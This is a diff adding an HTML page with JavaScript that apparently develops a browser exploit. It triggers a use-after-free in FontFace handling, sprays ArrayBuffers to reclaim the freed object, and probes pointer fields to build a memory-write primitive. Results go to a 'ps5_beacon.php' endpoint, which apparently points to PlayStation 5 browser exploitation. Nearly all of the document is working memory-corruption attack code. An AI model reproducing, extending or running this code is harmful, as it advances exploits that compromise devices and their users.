@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>P844v15</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#111;color:#0f0;font:11px/1.4 monospace;padding:8px;overflow-y:auto}
+#log{white-space:pre-wrap;word-break:break-all}
+</style>
+</head>
+<body>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(s){L.textContent+=s+'\n';}
+function bn(tag,data){
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/ps5_beacon.php?tag='+encodeURIComponent(tag)+'&data='+encodeURIComponent(data||''),false);
+    x.send();
+  }catch(e){}
+}
+var KEY='p844v15_test';
+function getTest(){try{return parseInt(localStorage.getItem(KEY))||0;}catch(e){return 0;}}
+function setTest(n){try{localStorage.setItem(KEY,String(n));}catch(e){}}
+function clearTest(){try{localStorage.removeItem(KEY);}catch(e){}}
+var testNum=getTest();
+log('P844v15 BOOT test='+testNum);
+bn('P844v15-BOOT','test='+testNum);
+
+function doUAF(id,cb){
+  var st=document.createElement('style');
+  st.textContent="@font-face{font-family:'UAF"+id+"';src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(st);
+  var face=new FontFace('UAF'+id+'F',"local('Helvetica')",{unicodeRange:'U+0041'});
+  document.fonts.add(face);void face.loaded;
+  var fabs=[],ffired=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){if(ffired)return undefined;ffired=true;
+      st.remove();st.textContent='';st=null;
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      fabs=[];for(var i=0;i<80;i++)fabs.push(new ArrayBuffer(192));
+      document.body.offsetHeight;
+      return undefined;
+    },set:function(){}});
+  document.fonts.load('1em UAF'+id+'F,UAF'+id,'AB').then(function(){}).catch(function(){});
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var hi=-1,bv=null;
+    for(var i=0;i<fabs.length;i++){var t=new BigUint64Array(fabs[i]);if(t[0]!==0n||t[11]!==0n){hi=i;bv=t;break;}}
+    cb(bv?{abs:fabs,bv:bv,face:face,hitIdx:hi}:null);
+  },800);
+}
+function fin(tag,data){bn(tag,data);log(tag.replace('P844v15-','')+': '+data);setTimeout(function(){location.reload();},100);}
+
+var TESTS=[
+
+// T0: face.load() with self pointers — FULL WRITE MAP
+// Snapshot AB before + after face.load(), report every changed byte
+function(){
+  setTest(1);
+  doUAF('T0',function(r){
+    if(!r)return fin('P844v15-T0-OK','uaf=miss');
+    var bv=r.bv;
+    var self=bv[11]-BigInt(0x58);
+    // Set up self-referential AB
+    bv[0]=1n;
+    for(var i=1;i<24;i++)bv[i]=self;
+    // Snapshot BEFORE face.load()
+    var snap=new BigUint64Array(24);
+    for(var i=0;i<24;i++)snap[i]=bv[i];
+    // Call face.load()
+    try{r.face.load();}catch(e){}
+    // Wait for promise + bg activity
+    setTimeout(function(){
+      var changed=[];
+      for(var i=0;i<24;i++){
+        if(bv[i]!==snap[i])changed.push('q'+i+':0x'+snap[i].toString(16)+'->0x'+bv[i].toString(16));
+      }
+      // Also check u8 level for sub-qword changes
+      var u8=new Uint8Array(r.abs[r.hitIdx]);
+      var bchanged=[];
+      for(var i=0;i<192;i++){
+        // reconstruct snap byte from snap qwords
+        var qi=Math.floor(i/8),bi=i%8;
+        var snapByte=Number((snap[qi]>>BigInt(bi*8))&0xFFn);
+        if(u8[i]!==snapByte)bchanged.push('+'+i+'=0x'+snapByte.toString(16)+'->0x'+u8[i].toString(16));
+      }
+      fin('P844v15-T0-OK','self=0x'+self.toString(16)+'|qchanged='+(changed.join(',')||'none')+'|bchanged='+(bchanged.join(',')||'none'));
+    },600);
+  });
+},
+
+// T1: face.load() with self — check face properties after
+function(){
+  setTest(2);
+  doUAF('T1',function(r){
+    if(!r)return fin('P844v15-T1-OK','uaf=miss');
+    var bv=r.bv;
+    var self=bv[11]-BigInt(0x58);
+    bv[0]=1n;for(var i=1;i<24;i++)bv[i]=self;
+    try{r.face.load();}catch(e){}
+    setTimeout(function(){
+      var o=[];
+      try{o.push('fam='+r.face.family);}catch(e){o.push('fam=ERR');}
+      try{o.push('st='+r.face.status);}catch(e){o.push('st=ERR');}
+      try{var ld=r.face.loaded;o.push('loaded='+(ld&&ld.then?'promise':'other'));}catch(e){o.push('loaded=ERR');}
+      // Check if face.load() resolved with a value
+      try{
+        r.face.load().then(function(v){o.push('res='+typeof v+':'+String(v).substring(0,30));})
+        .catch(function(e){o.push('rej='+e.message.substring(0,30));});
+      }catch(e){o.push('load2=ERR');}
+      setTimeout(function(){
+        fin('P844v15-T1-OK',o.join('|')+'|self=0x'+self.toString(16));
+      },300);
+    },600);
+  });
+},
+
+// T2-T6: Narrow q6-q10 — which specific qword is a pointer?
+// T2: q6 only
+function(){
+  setTest(3);
+  doUAF('T2',function(r){
+    if(!r)return fin('P844v15-T2-OK','uaf=miss');
+    r.bv[6]=0xDEAD0000DEADn;
+    var fam='?';try{fam=r.face.family;}catch(e){fam='ERR';}
+    fin('P844v15-T2-OK','fam='+fam);
+  });
+},
+// T3: q7 only
+function(){
+  setTest(4);
+  doUAF('T3',function(r){
+    if(!r)return fin('P844v15-T3-OK','uaf=miss');
+    r.bv[7]=0xDEAD0000DEADn;
+    var fam='?';try{fam=r.face.family;}catch(e){fam='ERR';}
+    fin('P844v15-T3-OK','fam='+fam);
+  });
+},
+// T4: q8 only
+function(){
+  setTest(5);
+  doUAF('T4',function(r){
+    if(!r)return fin('P844v15-T4-OK','uaf=miss');
+    r.bv[8]=0xDEAD0000DEADn;
+    var fam='?';try{fam=r.face.family;}catch(e){fam='ERR';}
+    fin('P844v15-T4-OK','fam='+fam);
+  });
+},
+// T5: q9 only
+function(){
+  setTest(6);
+  doUAF('T5',function(r){
+    if(!r)return fin('P844v15-T5-OK','uaf=miss');
+    r.bv[9]=0xDEAD0000DEADn;
+    var fam='?';try{fam=r.face.family;}catch(e){fam='ERR';}
+    fin('P844v15-T5-OK','fam='+fam);
+  });
+},
+// T6: q10 only
+function(){
+  setTest(7);
+  doUAF('T6',function(r){
+    if(!r)return fin('P844v15-T6-OK','uaf=miss');
+    r.bv[10]=0xDEAD0000DEADn;
+    var fam='?';try{fam=r.face.family;}catch(e){fam='ERR';}
+    fin('P844v15-T6-OK','fam='+fam);
+  });
+},
+
+// T7: q0 GATE TEST — set upper 32 bits to 1, keep refcount=1
+// q0 = 0x0000000100000001 — does this suppress bg crash?
+function(){
+  setTest(8);
+  doUAF('T7',function(r){
+    if(!r)return fin('P844v15-T7-OK','uaf=miss');
+    r.bv[0]=0x100000001n; // refcount=1, flags=1
+    r.bv[1]=0xDEAD0000DEADn; // q1 sentinel (would normally crash)
+    var fam='?';try{fam=r.face.family;}catch(e){fam='ERR';}
+    fin('P844v15-T7-OK','fam='+fam);
+  });
+},
+
+// T8: q0 GATE TEST 2 — set q0=0x200000001 + q11=0xDEAD
+function(){
+  setTest(9);
+  doUAF('T8',function(r){
+    if(!r)return fin('P844v15-T8-OK','uaf=miss');
+    r.bv[0]=0x200000001n; // refcount=1, flags=2
+    r.bv[11]=0xDEAD0000DEADn; // q11 sentinel (normally crashes)
+    var fam='?';try{fam=r.face.family;}catch(e){fam='ERR';}
+    fin('P844v15-T8-OK','fam='+fam);
+  });
+},
+
+// T9: face.load() with q1 pointing to AB2 (different buffer)
+// Set q0=1, q1=AB2 address, rest=self
+// After face.load(), check if AB2 was modified
+function(){
+  setTest(10);
+  doUAF('T9',function(r){
+    if(!r)return fin('P844v15-T9-OK','uaf=miss');
+    var bv=r.bv;
+    var self=bv[11]-BigInt(0x58);
+    // AB2 = next AB in spray (hitIdx+1)
+    var ab2idx=r.hitIdx+1;
+    if(ab2idx>=r.abs.length)ab2idx=r.hitIdx-1;
+    var bv2=new BigUint64Array(r.abs[ab2idx]);
+    // Fill AB2 with known pattern 0xAAAA...
+    for(var i=0;i<24;i++)bv2[i]=0xAAAAAAAAAAAAAAAAn;
+    // Set up main AB: q0=1, q1=AB2 (self + 192 if contiguous)
+    // BUT we don't know AB2's address! Use self±192 as guess
+    var ab2addr=self+192n; // guess: next contiguous slot
+    bv[0]=1n;
+    bv[1]=ab2addr; // redirect q1 to AB2
+    for(var i=2;i<24;i++)bv[i]=self;
+    try{r.face.load();}catch(e){}
+    setTimeout(function(){
+      // Check AB2 for modifications
+      var ab2changed=[];
+      for(var i=0;i<24;i++){
+        if(bv2[i]!==0xAAAAAAAAAAAAAAAAn)ab2changed.push('q'+i+'=0x'+bv2[i].toString(16));
+      }
+      fin('P844v15-T9-OK','ab2idx='+ab2idx+'|ab2changed='+(ab2changed.join(',')||'none')+'|self=0x'+self.toString(16));
+    },600);
+  });
+},
+
+// T10: face.load() with q0=0x100000001 (gate+refcount) + rest=self
+// Tests if face.load() still works with modified q0 flags
+function(){
+  setTest(11);
+  doUAF('T10',function(r){
+    if(!r)return fin('P844v15-T10-OK','uaf=miss');
+    var bv=r.bv;
+    var self=bv[11]-BigInt(0x58);
+    bv[0]=0x100000001n;
+    for(var i=1;i<24;i++)bv[i]=self;
+    var o=[];
+    try{
+      var p=r.face.load();o.push('load=ok');
+      p.then(function(){o.push('resolved');}).catch(function(e){o.push('rej:'+e.message.substring(0,30));});
+    }catch(e){o.push('load=ERR:'+e.message.substring(0,30));}
+    setTimeout(function(){
+      // Check for writes
+      var changed=[];
+      for(var i=0;i<24;i++){
+        var exp=(i===0)?0x100000001n:self;
+        if(bv[i]!==exp)changed.push('q'+i+'=0x'+bv[i].toString(16));
+      }
+      fin('P844v15-T10-OK',o.join('|')+'|changed='+(changed.join(',')||'none')+'|self=0x'+self.toString(16));
+    },600);
+  });
+}
+];
+
+var NAMES=['T0-loadWriteMap','T1-loadProps','T2-q6Dead','T3-q7Dead','T4-q8Dead','T5-q9Dead','T6-q10Dead',
+  'T7-gateQ1','T8-gateQ11','T9-loadAB2','T10-gateLoad'];
+
+function runTest(){
+  if(testNum>=TESTS.length){
+    log('ALL '+TESTS.length+' TESTS COMPLETE');
+    bn('P844v15-DONE','all='+TESTS.length);
+    clearTest();return;
+  }
+  log('Running '+NAMES[testNum]+'...');
+  try{TESTS[testNum]();}catch(e){
+    bn('P844v15-'+NAMES[testNum]+'-ERR',e.message);
+    setTest(testNum+1);setTimeout(function(){location.reload();},100);
+  }
+}
+setTimeout(runTest,200);
+</script>
+</body>
+</html>
